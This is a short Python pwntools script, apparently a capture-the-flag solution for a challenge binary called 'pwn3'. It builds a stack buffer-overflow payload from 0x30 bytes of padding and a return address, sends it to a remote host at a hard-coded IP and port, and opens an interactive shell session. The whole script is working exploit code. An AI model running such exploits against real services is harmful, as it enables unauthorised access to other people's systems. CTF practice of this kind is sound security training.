from pwn import *

#junk = "A" * 0x30  # Why not 0x30
junk = "A" * 0x30
#address = "\x96\x05\x40\x00\x00\x00\x00"
payload = junk + p64(0x400751)

#Io = process("./pwn3")
Io = remote("114.116.54.89",10003)
Io.sendline(payload)
Io.interactive()
